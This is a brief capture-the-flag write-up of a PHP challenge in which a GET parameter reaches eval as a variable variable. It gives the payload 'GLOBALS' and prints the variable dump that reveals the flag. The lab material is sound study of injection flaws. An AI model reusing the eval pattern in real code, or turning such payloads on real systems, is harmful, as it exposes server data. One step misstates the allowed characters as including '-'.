|Date|Version|
|:-:|:-:|
|2019/1/2|1.0|

## Writeup
1. The source code was given below:
```
flag In the variable !
<?php
error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>
```
2. As the code implied, *var_dump()* will output the variable called *$args*, which is just what we send with GET method.
3. Also, *args* will first be checked with regex
```
^\w+$
```
which means the whole string is composed only by letters, numbers and '_';

4. So it is clear that the payload we provide with GET should be:
    - letters, numbers, '-' only
    - the name of particular variable containing the flag

The global variable ***GLOBALS*** will list *ALL* variables and their values existed in current page and pages included.
***GLOBALS*** will show these in key-value pairs, and *flag* could be found inside:
```
array(7) { 
    ["GLOBALS"]=> *RECURSION* 
    ["_POST"]=> array(0) { } 
    ["_GET"]=> array(1) { ["args"]=> string(7) "GLOBALS" } 
    ["_COOKIE"]=> array(0) { } 
    ["_FILES"]=> array(0) { } 
    ["ZFkwe3"]=> string(38) "flag{92853051ab894a64f7865cf3c2128b34}" 
    ["args"]=> string(7) "GLOBALS" 
}
```
<br/>
<br/>

BTW, the key of real *flag* seems a little bit unpredictable.
Well it might be so naive to assume the flag would be called *flag*. :)